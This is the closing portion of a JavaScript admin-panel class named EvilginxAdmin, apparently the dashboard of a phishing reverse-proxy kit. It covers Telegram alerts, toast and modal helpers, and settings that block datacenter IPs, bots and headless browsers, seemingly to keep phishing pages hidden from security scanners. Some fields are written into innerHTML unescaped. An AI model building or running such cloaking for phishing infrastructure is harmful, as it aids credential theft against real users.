            this.toast('success', 'Test Sent', 'Check your Telegram for the test message');
        } else {
            this.toast('error', 'Test Failed', result.message || 'Could not send test message');
        }
    }

    // ===== Modal =====
    openModal(title, bodyHtml, footerHtml) {
        document.getElementById('modal-title').textContent = title;
        document.getElementById('modal-body').innerHTML = bodyHtml;
        document.getElementById('modal-footer').innerHTML = footerHtml;
        document.getElementById('modal').classList.remove('hidden');
    }

    closeModal() {
        document.getElementById('modal').classList.add('hidden');
    }

    // ===== Toast Notifications =====
    toast(type, title, message) {
        const container = document.getElementById('toast-container');
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        
        const icons = {
            success: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>',
            error: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>',
            warning: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>',
            info: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>'
        };

        toast.innerHTML = `
            <div class="toast-icon">${icons[type]}</div>
            <div class="toast-content">
                <div class="toast-title">${title}</div>
                <div class="toast-message">${message}</div>
            </div>
        `;

        container.appendChild(toast);

        setTimeout(() => {
            toast.classList.add('toast-out');
            setTimeout(() => toast.remove(), 300);
        }, 4000);
    }

    // ===== Utilities =====
    escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    copyToClipboard(text) {
        navigator.clipboard.writeText(text).then(() => {
            this.toast('success', 'Copied', 'Text copied to clipboard');
        }).catch(() => {
            this.toast('error', 'Error', 'Failed to copy');
        });
    }

    // ===== Security =====
    async loadSecurity() {
        // Load security settings
        const result = await this.apiRequest('/security');
        if (result.success) {
            const data = result.data;
            document.getElementById('sec-block-datacenters').checked = data.block_datacenters;
            document.getElementById('sec-block-bots').checked = data.block_bots;
            document.getElementById('sec-block-headless').checked = data.block_headless;

            // Update stats
            if (data.stats) {
                document.getElementById('stat-dc-ranges').textContent = data.stats.datacenter_ranges || 0;
                document.getElementById('stat-custom-ranges').textContent = data.stats.custom_ranges || 0;
                document.getElementById('stat-whitelisted').textContent = data.stats.whitelisted_ips || 0;
                document.getElementById('stat-bot-patterns').textContent = data.stats.bot_patterns || 0;
            }
        }

        // Load blocked ranges
        await this.loadBlockedRanges();

        // Load whitelisted IPs
        await this.loadWhitelistedIPs();
    }

    async saveSecuritySettings() {
        const settings = {
            block_datacenters: document.getElementById('sec-block-datacenters').checked,
            block_bots: document.getElementById('sec-block-bots').checked,
            block_headless: document.getElementById('sec-block-headless').checked
        };

        const result = await this.apiRequest('/security', {
            method: 'POST',
            body: JSON.stringify(settings)
        });

        if (result.success) {
            this.toast('success', 'Settings Saved', 'Security settings updated');
        } else {
            this.toast('error', 'Error', result.message || 'Failed to save settings');
        }
    }

    async loadBlockedRanges() {
        const result = await this.apiRequest('/security/blocked-ranges');
        const container = document.getElementById('blocked-ranges-list');

        if (!result.success || !result.data || result.data.length === 0) {
            container.innerHTML = '<div class="empty-state">No custom blocked ranges</div>';
            return;
        }

        container.innerHTML = result.data.map(range => `
            <div class="ip-item">
                <span class="ip-address">${this.escapeHtml(range)}</span>
                <button class="btn-remove" onclick="admin.removeBlockedRange('${this.escapeHtml(range)}')" title="Remove">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <line x1="18" y1="6" x2="6" y2="18"/>
                        <line x1="6" y1="6" x2="18" y2="18"/>
                    </svg>
                </button>
            </div>
        `).join('');
    }

    async loadWhitelistedIPs() {
        const result = await this.apiRequest('/security/whitelisted-ips');
        const container = document.getElementById('whitelisted-ips-list');

        if (!result.success || !result.data || result.data.length === 0) {
            container.innerHTML = '<div class="empty-state">No whitelisted IPs</div>';
            return;
        }

        container.innerHTML = result.data.map(ip => `
            <div class="ip-item">
                <span class="ip-address">${this.escapeHtml(ip)}</span>
                <button class="btn-remove" onclick="admin.removeWhitelistedIP('${this.escapeHtml(ip)}')" title="Remove">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <line x1="18" y1="6" x2="6" y2="18"/>
                        <line x1="6" y1="6" x2="18" y2="18"/>
                    </svg>
                </button>
            </div>
        `).join('');
    }

    showAddBlockedRangeModal() {
        this.openModal('Add Blocked IP Range', `
            <div class="form-group">
                <label for="new-blocked-range">IP Address or CIDR Range</label>
                <input type="text" id="new-blocked-range" placeholder="e.g., 192.168.1.0/24 or 10.0.0.1">
                <p class="form-hint">Enter a single IP or CIDR notation (e.g., 10.0.0.0/8)</p>
            </div>
        `, `
            <button class="btn btn-secondary" onclick="admin.closeModal()">Cancel</button>
            <button class="btn btn-primary" onclick="admin.addBlockedRange()">Add Range</button>
        `);
    }

    async addBlockedRange() {
        const cidr = document.getElementById('new-blocked-range').value.trim();
        if (!cidr) {
            this.toast('error', 'Error', 'Please enter an IP address or range');
            return;
        }

        const result = await this.apiRequest('/security/blocked-ranges', {
            method: 'POST',
            body: JSON.stringify({ cidr })
        });

        if (result.success) {
            this.toast('success', 'Range Added', `Blocked ${cidr}`);
            this.closeModal();
            this.loadBlockedRanges();
            this.loadSecurity();
        } else {
            this.toast('error', 'Error', result.message || 'Failed to add range');
        }
    }

    async removeBlockedRange(cidr) {
        const result = await this.apiRequest('/security/blocked-ranges', {
            method: 'DELETE',
            body: JSON.stringify({ cidr })
        });

        if (result.success) {
            this.toast('success', 'Range Removed', `Unblocked ${cidr}`);
            this.loadBlockedRanges();
            this.loadSecurity();
        } else {
            this.toast('error', 'Error', result.message || 'Failed to remove range');
        }
    }

    showAddWhitelistModal() {
        this.openModal('Add Whitelisted IP', `
            <div class="form-group">
                <label for="new-whitelist-ip">IP Address or CIDR Range</label>
                <input type="text" id="new-whitelist-ip" placeholder="e.g., 192.168.1.100 or 10.0.0.0/24">
                <p class="form-hint">IPs in whitelist bypass all security checks</p>
            </div>
        `, `
            <button class="btn btn-secondary" onclick="admin.closeModal()">Cancel</button>
            <button class="btn btn-primary" onclick="admin.addWhitelistedIP()">Add IP</button>
        `);
    }

    async addWhitelistedIP() {
        const ip = document.getElementById('new-whitelist-ip').value.trim();
        if (!ip) {
            this.toast('error', 'Error', 'Please enter an IP address');
            return;
        }

        const result = await this.apiRequest('/security/whitelisted-ips', {
            method: 'POST',
            body: JSON.stringify({ ip })
        });

        if (result.success) {
            this.toast('success', 'IP Whitelisted', `Added ${ip} to whitelist`);
            this.closeModal();
            this.loadWhitelistedIPs();
            this.loadSecurity();
        } else {
            this.toast('error', 'Error', result.message || 'Failed to add IP');
        }
    }

    async removeWhitelistedIP(ip) {
        const result = await this.apiRequest('/security/whitelisted-ips', {
            method: 'DELETE',
            body: JSON.stringify({ ip })
        });

        if (result.success) {
            this.toast('success', 'IP Removed', `Removed ${ip} from whitelist`);
            this.loadWhitelistedIPs();
            this.loadSecurity();
        } else {
            this.toast('error', 'Error', result.message || 'Failed to remove IP');
        }
    }

    async testIP() {
        const ip = document.getElementById('test-ip-input').value.trim();
        const resultDiv = document.getElementById('test-ip-result');

        if (!ip) {
            this.toast('error', 'Error', 'Please enter an IP address to test');
            return;
        }

        const result = await this.apiRequest('/security/test-ip', {
            method: 'POST',
            body: JSON.stringify({ ip })
        });

        resultDiv.classList.remove('hidden', 'blocked', 'allowed', 'warning');

        if (result.success && result.data) {
            const data = result.data;
            if (data.blocked) {
                resultDiv.classList.add('blocked');
                resultDiv.innerHTML = `
                    <strong>BLOCKED</strong><br>
                    Reason: ${data.reason}<br>
                    Details: ${data.details}
                `;
            } else if (data.reason === 'datacenter_ip') {
                resultDiv.classList.add('warning');
                resultDiv.innerHTML = `
                    <strong>DATACENTER IP (Currently Allowed)</strong><br>
                    Details: ${data.details}
                `;
            } else {
                resultDiv.classList.add('allowed');
                resultDiv.innerHTML = `
                    <strong>ALLOWED</strong><br>
                    ${data.details}
                `;
            }
        } else {
            resultDiv.classList.add('blocked');
            resultDiv.innerHTML = `<strong>ERROR</strong><br>${result.message || 'Could not test IP'}`;
        }
    }
}

// Initialize
const admin = new EvilginxAdmin();

